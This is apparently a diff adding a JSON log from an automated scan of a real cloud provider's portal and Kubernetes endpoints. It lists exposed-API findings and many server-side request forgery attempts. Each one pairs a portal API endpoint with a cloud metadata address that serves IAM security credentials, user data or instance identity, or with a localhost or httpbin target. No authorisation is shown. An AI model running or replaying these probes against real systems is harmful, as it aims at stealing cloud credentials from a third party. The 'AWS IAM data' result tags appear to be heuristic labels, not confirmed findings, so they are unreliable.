@@ -1,0 +1,174 @@
+{
+  "timestamp": 1763066641.368333,
+  "confirmed_credential_leaks": [],
+  "sos_sks_findings": [
+    [
+      "SKS",
+      "ch-dk-2",
+      "K8s API Exposure",
+      "https://sks-ch-dk-2.exo.io/"
+    ],
+    [
+      "SKS",
+      "ch-dk-2",
+      "K8s API Exposure",
+      "https://sks-ch-dk-2.exo.io/healthz"
+    ],
+    [
+      "SKS",
+      "ch-gva-2",
+      "K8s API Exposure",
+      "https://sks-ch-gva-2.exo.io/"
+    ],
+    [
+      "SKS",
+      "ch-gva-2",
+      "K8s API Exposure",
+      "https://sks-ch-gva-2.exo.io/healthz"
+    ]
+  ],
+  "authentication_bypass_attempts": [],
+  "api_access_findings": [],
+  "ssrf_data_extraction": [
+    [
+      "https://portal.exoscale.com/api/import",
+      "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+      "AWS IAM data"
+    ],
+    [
+      "https://portal.exoscale.com/api/import",
+      "http://169.254.169.254/latest/user-data",
+      "JSON content"
+    ],
+    [
+      "https://portal.exoscale.com/api/import",
+      "http://169.254.169.254/latest/dynamic/instance-identity/document",
+      "169.254.169.254 response"
+    ],
+    [
+      "https://portal.exoscale.com/api/import",
+      "http://localhost/version",
+      "JSON content"
+    ],
+    [
+      "https://portal.exoscale.com/api/import",
+      "http://127.0.0.1/health",
+      "JSON content"
+    ],
+    [
+      "https://portal.exoscale.com/api/import",
+      "http://httpbin.org/json",
+      "httpbin response"
+    ],
+    [
+      "https://portal.exoscale.com/api/import",
+      "http://httpbin.org/xml",
+      "httpbin response"
+    ],
+    [
+      "https://portal.exoscale.com/api/fetch",
+      "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+      "AWS IAM data"
+    ],
+    [
+      "https://portal.exoscale.com/api/fetch",
+      "http://169.254.169.254/latest/user-data",
+      "JSON content"
+    ],
+    [
+      "https://portal.exoscale.com/api/fetch",
+      "http://169.254.169.254/latest/dynamic/instance-identity/document",
+      "169.254.169.254 response"
+    ],
+    [
+      "https://portal.exoscale.com/api/fetch",
+      "http://localhost/version",
+      "JSON content"
+    ],
+    [
+      "https://portal.exoscale.com/api/fetch",
+      "http://127.0.0.1/health",
+      "JSON content"
+    ],
+    [
+      "https://portal.exoscale.com/api/fetch",
+      "http://httpbin.org/json",
+      "httpbin response"
+    ],
+    [
+      "https://portal.exoscale.com/api/fetch",
+      "http://httpbin.org/xml",
+      "httpbin response"
+    ],
+    [
+      "https://portal.exoscale.com/api/load",
+      "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+      "AWS IAM data"
+    ],
+    [
+      "https://portal.exoscale.com/api/load",
+      "http://169.254.169.254/latest/user-data",
+      "JSON content"
+    ],
+    [
+      "https://portal.exoscale.com/api/load",
+      "http://169.254.169.254/latest/dynamic/instance-identity/document",
+      "169.254.169.254 response"
+    ],
+    [
+      "https://portal.exoscale.com/api/load",
+      "http://localhost/version",
+      "JSON content"
+    ],
+    [
+      "https://portal.exoscale.com/api/load",
+      "http://127.0.0.1/health",
+      "JSON content"
+    ],
+    [
+      "https://portal.exoscale.com/api/load",
+      "http://httpbin.org/json",
+      "httpbin response"
+    ],
+    [
+      "https://portal.exoscale.com/api/load",
+      "http://httpbin.org/xml",
+      "httpbin response"
+    ],
+    [
+      "https://portal.exoscale.com/api/webhook",
+      "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+      "AWS IAM data"
+    ],
+    [
+      "https://portal.exoscale.com/api/webhook",
+      "http://169.254.169.254/latest/user-data",
+      "JSON content"
+    ],
+    [
+      "https://portal.exoscale.com/api/webhook",
+      "http://169.254.169.254/latest/dynamic/instance-identity/document",
+      "169.254.169.254 response"
+    ],
+    [
+      "https://portal.exoscale.com/api/webhook",
+      "http://localhost/version",
+      "JSON content"
+    ],
+    [
+      "https://portal.exoscale.com/api/webhook",
+      "http://127.0.0.1/health",
+      "JSON content"
+    ],
+    [
+      "https://portal.exoscale.com/api/webhook",
+      "http://httpbin.org/json",
+      "httpbin response"
+    ],
+    [
+      "https://portal.exoscale.com/api/webhook",
+      "http://httpbin.org/xml",
+      "httpbin response"
+    ]
+  ]
+}
